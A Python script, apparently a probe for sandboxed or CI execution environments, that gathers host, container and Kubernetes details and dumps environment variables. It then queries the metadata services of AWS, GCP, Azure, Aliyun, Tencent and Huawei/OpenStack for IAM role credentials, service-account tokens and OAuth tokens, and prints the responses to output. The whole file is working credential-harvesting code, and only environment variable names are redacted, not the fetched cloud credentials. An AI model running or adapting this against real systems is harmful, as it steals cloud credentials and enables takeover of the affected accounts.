import os, sys, socket, subprocess, urllib.request, urllib.error

TAG = "C211R3"

def run(cmd, t=10):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        out = (p.stdout or "")
        if p.stderr:
            out += "|stderr:" + p.stderr[:200]
        return out.strip()[:1200]
    except Exception as e:
        return "ERR:%s" % str(e)[:160]

def fetch(url, headers=None, method="GET", t=4, read=2000):
    try:
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        with urllib.request.urlopen(req, timeout=t) as r:
            b = r.read(read)
            try:
                txt = b.decode("utf-8", "replace")
            except Exception:
                txt = repr(b)
            return {"status": r.status, "body": txt[:read]}
    except urllib.error.HTTPError as e:
        try:
            eb = e.read(300).decode("utf-8", "replace")
        except Exception:
            eb = ""
        return {"status": e.code, "body": eb}
    except Exception as e:
        return {"status": None, "body": "ERR:%s" % str(e)[:160]}

def show(label, res):
    print("%s %s: status=%s body=%s" % (TAG, label, res.get("status"), res.get("body", "").replace("\n", "\\n")[:1500]), flush=True)

def main():
    print("=== %s-PROBE-BEGIN intent=4854 readonly-transient ===" % TAG, flush=True)
    print("%s py:" % TAG, sys.version.replace("\n", " "), flush=True)
    print("%s id:" % TAG, run("id"), flush=True)
    print("%s hostname:" % TAG, socket.gethostname(), flush=True)
    print("%s hostname_f:" % TAG, run("hostname -f 2>&1; cat /etc/hostname 2>&1"), flush=True)
    print("%s uname:" % TAG, run("uname -a"), flush=True)
    print("%s pid1_cgroup:" % TAG, run("cat /proc/1/cgroup | head -8"), flush=True)
    print("%s kube:" % TAG, run("echo KUBECONFIG=${KUBECONFIG:-unset}; ls -ld /root/.kube /home/*/.kube /etc/kubernetes /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -30"), flush=True)
    print("%s env_begin:" % TAG, flush=True)
    for k in sorted(os.environ):
        v = os.environ[k]
        lk = k.lower()
        if any(s in lk for s in ("token", "secret", "password", "passwd", "key", "auth", "credential", "ssh")):
            print("   %s=<redacted len=%d>" % (k, len(v)), flush=True)
        else:
            print("   %s=%s" % (k, v[:200]), flush=True)
    print("%s env_end:" % TAG, flush=True)

    # ---- AWS IMDSv2 (token then iam/security-credentials) ----
    tok = fetch("http://169.254.169.254/latest/api/token",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT")
    show("aws_token", tok)
    h2 = {}
    if tok.get("status") == 200 and tok.get("body"):
        h2 = {"X-aws-ec2-metadata-token": tok["body"].strip()}
    show("aws_root_v2", fetch("http://169.254.169.254/latest/meta-data/", headers=h2))
    show("aws_root_v1", fetch("http://169.254.169.254/latest/meta-data/"))
    roles = fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=h2)
    show("aws_iam_roles", roles)
    role = (roles.get("body") or "").strip().splitlines()
    if roles.get("status") == 200 and role:
        rn = role[0].strip()
        if rn and "ERR:" not in rn and len(rn) < 200:
            show("aws_creds_%s" % rn, fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + urllib.parse.quote(rn), headers=h2))
    show("aws_ident", fetch("http://169.254.169.254/latest/dynamic/instance-identity/document", headers=h2))

    # ---- GCE metadata ----
    show("gcp_root", fetch("http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
                           headers={"Metadata-Flavor": "Google"}))
    show("gcp_root_ip", fetch("http://169.254.169.254/computeMetadata/v1/instance/?recursive=true",
                              headers={"Metadata-Flavor": "Google"}))
    show("gcp_sa_token", fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                               headers={"Metadata-Flavor": "Google"}))

    # ---- Azure IMDS ----
    show("azure_instance", fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                                 headers={"Metadata": "true"}))
    show("azure_token", fetch("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                              headers={"Metadata": "true"}))

    # ---- Aliyun metadata (100.100.100.200) ----
    show("aliyun_root", fetch("http://100.100.100.200/latest/meta-data/"))
    al = fetch("http://100.100.100.200/latest/meta-data/ram/security-credentials/")
    show("aliyun_ram_roles", al)
    alr = (al.get("body") or "").strip().splitlines()
    if al.get("status") == 200 and alr:
        rn = alr[0].strip()
        if rn and "ERR:" not in rn and len(rn) < 200:
            show("aliyun_creds_%s" % rn, fetch("http://100.100.100.200/latest/meta-data/ram/security-credentials/" + urllib.parse.quote(rn)))
    show("aliyun_instance_id", fetch("http://100.100.100.200/latest/meta-data/instance-id"))

    # ---- Tencent CVM metadata (169.254.0.23) ----
    show("tencent_root", fetch("http://169.254.0.23/latest/meta-data/"))
    tc = fetch("http://169.254.0.23/latest/meta-data/cam/security-credentials/")
    show("tencent_cam_roles", tc)
    tcr = (tc.get("body") or "").strip().splitlines()
    if tc.get("status") == 200 and tcr:
        rn = tcr[0].strip()
        if rn and "ERR:" not in rn and len(rn) < 200:
            show("tencent_creds_%s" % rn, fetch("http://169.254.0.23/latest/meta-data/cam/security-credentials/" + urllib.parse.quote(rn)))
    show("tencent_root_dns", fetch("http://metadata.tencentyun.com/latest/meta-data/"))

    # ---- Huawei Cloud / OpenStack metadata (169.254.169.254) ----
    show("huawei_meta", fetch("http://169.254.169.254/openstack/latest/meta_data.json"))
    show("huawei_userdata", fetch("http://169.254.169.254/openstack/latest/user_data"))
    show("huawei_network", fetch("http://169.254.169.254/openstack/latest/network_data.json"))

    print("=== %s-PROBE-END ===" % TAG, flush=True)

try:
    import urllib.parse
    main()
except Exception as e:
    print("%s-PROBE-ERROR %s" % (TAG, str(e)[:300]), flush=True)
